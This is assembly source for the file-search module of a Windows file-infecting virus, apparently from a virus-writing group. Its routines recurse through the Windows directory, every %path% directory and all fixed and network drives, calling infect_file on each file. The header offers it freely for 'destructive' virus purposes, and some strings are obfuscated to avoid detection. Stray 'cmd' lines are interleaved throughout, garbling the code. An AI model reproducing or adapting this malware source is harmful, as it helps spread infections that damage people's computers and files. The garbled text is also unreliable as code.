   ; RECSERCH 1.50

   ;                                DESCRIPTION
   ;
   ; here is asm source of recursive file search & other shit you need so much ;)
   ;
   ; subroutines:
   ;
   ; Ú process_windir()            process directory %windir% & all subdirs
   ; Ã process_path()              process all directories/subdirs from %path%
   ; Ã process_drives()            recursive process each fixed drive
   ; ÀÄ process_directory()       process specified directory & all subdirs
   ;      ÀÄ process_file()       process specified file (dump filename)
   ;
   ; all subroutines are offset-independent, i.e. you may call'em with any
   ; displacement.
   ;
   ;                                 DISCLAIMER
   ;
   ; You're free you use these sources for any vx-oriented destructive purposes.
   ; No fuckin pacific or commercial usage available.
   ;
   ;                               Seek & Enjoy! X-)
   ;                                                      http://z0mbie.cjb.net


   ff_struc                struc                   ; win32 "searchrec" structure
   ff_attr                 dd      ?
   ff_time_create          dd      ?,?
   ff_time_lastaccess      dd      ?,?
   ff_time_lastwrite       dd      ?,?
   ff_size_hi              dd      ?
   ff_size                 dd      ?
                           dd      ?,?
   ff_fullname             db      260 dup (?)
   ff_shortname            db      14 dup (?)
                           ends

   ; subroutine: process_windir
   ; action:     process md directory & all subdirs
   ;             1. get %windir%
   ;             2. call process_directory
   ; input:      EDI=ff_struc
   ; output:     none

   cmd
   process_windir          proc    pascal
   cmd
                           local   windir:BYTE:1024
   cmd
                           pusha
   cmd
                           lea     eax, windir
   cmd
                           push    eax
   cmd
                           push    1024
   cmd
                           push    eax
   cmd
                           call    xxGetWindowsDirectoryA
   cmd
                           pop     edx
   cmd
                           call    process_directory
   cmd
                           popa
   cmd
                           ret
   cmd
                           endp
   cmd

   ; subroutine: process_path
   ; action:     process all dirs/subdirs from %path%
   ;             1. get %path%
   ;             2. parse %path% and call process_directory for each dirname
   ; input:      EDI=ff_struc
   ; output:     none

   cmd
   process_path            proc    pascal
   cmd
                           local   path:BYTE:1024
   cmd
                           pusha
   cmd
                           lea     esi, path
   cmd
                           mov     dword ptr [esi], not 'PATH'
   cmd
                           not     dword ptr [esi]
   cmd
                           mov     byte ptr [esi+4], 0
   cmd
                           mov     ebx, 1024-1
   cmd
                           push    ebx
   cmd
                           push    esi
   cmd
                           push    esi
   cmd
                           call    xxGetEnvironmentVariableA
   cmd
                           mov     byte ptr [esi+ebx], 0
   cmd
   __cycle:                mov     edx, esi
   cmd
   __scan:                 lodsb
   cmd
                           or      al, al
   cmd
                           jz      __done
   cmd
                           cmp     al, ';'
   cmd
                           jne     __scan
   cmd
   __done:                 sub     [esi-1], al
   cmd
                           call    process_directory
   cmd
                           or      al, al
   cmd
                           jnz     __cycle
   cmd
                           popa
   cmd
                           ret
   cmd
                           endp
   cmd

   ; subroutine: process_drives
   ; action:     for each drive (A:..Z:) with type DRIVE_FIXED||DRIVE_REMOTE
   ;             call subroutine process_directory passing drive's root as arg
   ; input:      EDI=ff_struc
   ; output:     none

   cmd
   process_drives:         pusha
   cmd
                           mov     eax, -'\:A'
   cmd
                           neg     eax
   cmd
                           push    eax
   cmd
   __cycle:                push    esp
   cmd
                           call    xxGetDriveTypeA
   cmd
                           sub     eax, 3        ; DRIVE_FIXED=3  DRIVE_REMOTE=4
   cmd
                           cmp     eax, 1
   cmd
                           ja      __next
   cmd
                           mov     edx, esp
   cmd
                           call    process_directory
   cmd
   __next:                 inc     byte ptr [esp]
   cmd
                           cmp     byte ptr [esp], 'Z'
   cmd
                           jbe     __cycle
   cmd
                           pop     ecx
   cmd
                           popa
   cmd
                           ret
   cmd

   ; subroutine: process_directory
   ; action:     1. set current directory to one specified by EDX
   ;             2. find all files in the current directory
   ;             3. for each found directory (except "."/"..") recursive call;
   ;                for each found file call process_file
   ;             4. set current directory to ".."
   ; input:      EDI=ff_struc
   ;             EDX=directory name (should be full path if 1st call)
   ; output:     none

   cmd
   process_directory:      pusha

   cmd
                           mov     ecx, 1024/4
   cmd
   __0:                    push    ecx
   cmd
                           dec     ecx
   cmd
                           jnz     __0

   cmd
                           mov     ebx, edi
   cmd
                           mov     esi, edx
   cmd
                           mov     edi, esp
   cmd
   __1:                    lodsb
   cmd
                           stosb
   cmd
                           or      al, al
   cmd
                           jnz     __1
   cmd
                           dec     edi
   cmd
                           mov     al, '\'
   cmd
                           cmp     [edi-1], al
   cmd
                           je      __3
   cmd
                           stosb
   cmd
   __3:                    mov     ebp, edi
   cmd
                           mov     eax, not '*.*'
   cmd
                           not     eax
   cmd
                           stosd
   cmd
                           mov     edi, ebx

   cmd
                           mov     eax, esp
   cmd
                           push    edi
   cmd
                           push    eax
   cmd
                           call    xxFindFirstFileA
   cmd
                           mov     esi, eax
   cmd
                           inc     eax
   cmd
                           jz      __exit

   cmd
   __cycle:
   cmd

   cmd
                           pusha
   cmd
                           lea     esi, [edi].ff_fullname
   cmd
                           mov     edi, ebp
   cmd
   __2:                    lodsb
   cmd
                           stosb
   cmd
                           or      al, al
   cmd
                           jnz     __2
   cmd
                           popa
   cmd
                           mov     edx, esp
   cmd
                           test    byte ptr [edi].ff_attr, 16
   cmd
                           jnz     __dir
   cmd
                           call    process_file
   cmd
                           clc
   cmd
                           jnc     __next
   cmd

   cmd
   __dir:                  lea     eax, [edi].ff_fullname
   cmd
                           cmp     byte ptr [eax], '.'
   cmd
                           je      __next
   cmd

   cmd
                           call    process_directory
   cmd

   cmd
   __next:                 push    edi
   cmd
                           push    esi
   cmd
                           call    xxFindNextFileA
   cmd
                           or      eax, eax
   cmd
                           jnz     __cycle
   cmd

   cmd
   __exit:                 push    esi
   cmd
                           call    xxFindClose

   cmd
                           add     esp, 1024

   cmd
                           popa
   cmd
                           ret
   cmd

   ; subroutine: process_file
   ; action:     handle each file found by process_directory
   ; input:      EDI=ff_struc
   ;             EDX=file name ([edi].ff_fullname)
   ; output:     none

   cmd
   process_file:           pusha
   cmd

   cmd
                           call    infect_file
   cmd

   cmd
                           popa
   cmd
                           ret
   cmd
